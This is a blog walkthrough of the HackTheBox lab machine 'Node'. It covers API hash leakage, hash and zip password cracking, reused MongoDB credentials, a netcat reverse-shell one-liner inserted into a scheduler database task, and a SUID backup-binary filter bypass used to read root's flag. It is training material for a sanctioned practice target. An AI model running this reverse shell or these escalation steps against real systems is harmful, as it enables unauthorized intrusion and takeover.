---
layout: post
title: Hackthebox Node Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-07/node-badge.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box "Node".<br>

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
{% highlight shell %}
root@kali:~# nmap -p- 10.10.10.58 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 21:28 EEST
Nmap scan report for 10.10.10.58
Host is up (0.040s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
| hadoop-datanode-info:
|_  Logs: /login
| hadoop-tasktracker-info:
|_  Logs: /login
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.96 seconds
{% endhighlight %}


## 2. Getting User

We can find a NodeJS website on port 3000.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-07/2020-04-05-21-35-11.png)

Using Burp Suite, we can find an interesting HTTP request to "/api/users/latest".
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-07/2020-04-05-21-40-44.png)

Then, access to the API.<br>
We can see some passwords for user "tom", "mark" and "rastating".
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.58:3000/api/users/latest | jq
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
{% endhighlight %}

Next, try "/api/users".<br>
We can find an admin user "myP14ceAdm1nAcc0uNT".
{% highlight shell %}
root@kali:~# curl -s http://10.10.10.58:3000/api/users/ | jq
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
{% endhighlight %}

We can crack the password using <a href="https://crackstation.net/">Crackstation.net</a>.<br>
The cracked password is "manchester".
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-07/2020-04-05-21-57-05.png)

We can download a file "myplace.backup" base64 encoded.
![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-04-07/2020-04-05-22-00-44.png)

Try to decode with base64 command.
{% highlight shell %}
root@kali:~# cat myplace.backup | base64 --decode > myplace
root@kali:~# file myplace
myplace: Zip archive data, at least v1.0 to extract
{% endhighlight %}

Since the zip file is password protected, try to brute-force using "fcrackzip".<br>
The password is "magicword".
{% highlight shell %}
root@kali:~# unzip myplace
Archive:  myplace
[myplace] var/www/myplace/package-lock.json password:

root@kali:~# fcrackzip -D -p /usr/share/wordlists/rockyou.txt myplace
possible pw found: magicword ()
{% endhighlight %}

Then, unzip the archive.
It looks like a source code of a NodeJS web application.
{% highlight shell %}
root@kali:~# unzip myplace
Archive:  myplace
[myplace] var/www/myplace/package-lock.json password:
  inflating: var/www/myplace/package-lock.json
  inflating: var/www/myplace/node_modules/serve-static/README.md
  inflating: var/www/myplace/node_modules/serve-static/index.js

---
{% endhighlight %}

Take a look at the source code.<br>
In "/var/www/myplace/app.js", we can find a mongodb credential for user "mark".
{% highlight shell %}
root@kali:~/var/www/myplace# cat app.js | grep mongo
const MongoClient = require('mongodb').MongoClient;
const ObjectID    = require('mongodb').ObjectID;
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
    console.log('[!] Failed to connect to mongodb');
{% endhighlight %}

We can use the credential for SSH connection.
{% highlight shell %}
mark:5AYRft73VtFpc84k
{% endhighlight %}
{% highlight shell %}
root@kali:~# ssh mark@10.10.10.58
mark@10.10.10.58's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.




              .-. 
        .-'``(|||) 
     ,`\ \    `-`.                 88                         88 
    /   \ '``-.   `                88                         88 
  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
 (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
        `-..-(   ) 
              `-` 




The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Wed Sep 27 02:33:14 2017 from 10.10.14.3
mark@node:~$ id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
{% endhighlight %}

However, we are still not capable of getting user.txt.<br>
We have other 2 users.
{% highlight shell %}
mark@node:/home$ ls -l
total 12
drwxr-xr-x 2 root root 4096 Aug 31  2017 frank
drwxr-xr-x 3 root root 4096 Sep  3  2017 mark
drwxr-xr-x 6 root root 4096 Sep  3  2017 tom
{% endhighlight %}

If take a look at the processes, we can see 2 processes by another user "tom".
{% highlight shell %}
mark@node:~$ ps aux | grep tom
tom       1211  0.0  5.8 1074616 44232 ?       Ssl  19:31   0:03 /usr/bin/node /var/scheduler/app.js
tom       1231  0.0  6.6 1024156 50068 ?       Ssl  19:31   0:04 /usr/bin/node /var/www/myplace/app.js
mark      1610  0.0  0.1  14228  1020 pts/0    S+   23:05   0:00 grep --color=auto tom
{% endhighlight %}

Using the following command, we can access the command line interface of MongoDB.<br>
Also it is possible to insert reverse shell command.
{% highlight shell %}
mark@node:~$ mongo -u mark -p 5AYRft73VtFpc84k localhost/scheduler
MongoDB shell version: 3.2.16
connecting to: localhost/scheduler
> db.tasks.insertOne( { cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.6 4444 >/tmp/f" } );
{
        "acknowledged" : true,
        "insertedId" : ObjectId("5e8b80f878ddbff46dfcb0d7")
}
> exit
bye
{% endhighlight %}

Launch a netcat listener.
{% highlight shell %}
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...

{% endhighlight %}

After a few minutes, we can get a reverse shell as user "tom".
{% highlight shell %}
root@kali:~# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.58] 38860
bash: cannot set terminal process group (1230): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

tom@node:/$ id
id
uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
{% endhighlight %}

user.txt is in the directory "/home/tom".
{% highlight shell %}
tom@node:/$ cd /home/tom
cd /home/tom
tom@node:~$ ls
ls
user.txt
tom@node:~$ cat user.txt
cat user.txt
e1156acc3574e04b06908ecf76be91b1
{% endhighlight %}


## 3. Getting Root

With the following command, we can find a binary file "/usr/local/bin/backup"
{% highlight shell %}
tom@node:/tmp$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/local/bin/backup
/usr/bin/chfn
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/bin/ping
/bin/umount
/bin/fusermount
/bin/ping6
/bin/ntfs-3g
/bin/su
/bin/mount
{% endhighlight %}

Also, we can find a way to use this executable in the previous script "/var/www/myplace/app.js".<br>
The "backup_key" is also in this code.
{% highlight shell %}
200   app.get('/api/admin/backup', function (req, res) {
201     if (req.session.user && req.session.user.is_admin) {
202       var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
203       var backup = '';
{% endhighlight %}

This time, we can bypass the filter of the binary with the following way.
{% highlight shell %}
tom@node:/tmp$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip
<0afc3d98a8d0230167104d474 "/roo\t/roo\t.txt" | base64 -d > /tmp/flag.zip    

tom@node:/tmp$ unzip -P magicword flag.zip
unzip -P magicword flag.zip
Archive:  flag.zip
 extracting: root/root.txt
{% endhighlight %}

Now we extracted the root.txt
{% highlight shell %}
tom@node:/tmp$ cat root/root.txt
cat root/root.txt
1722e99ca5f353b362556a62bd5e6be0
{% endhighlight %}
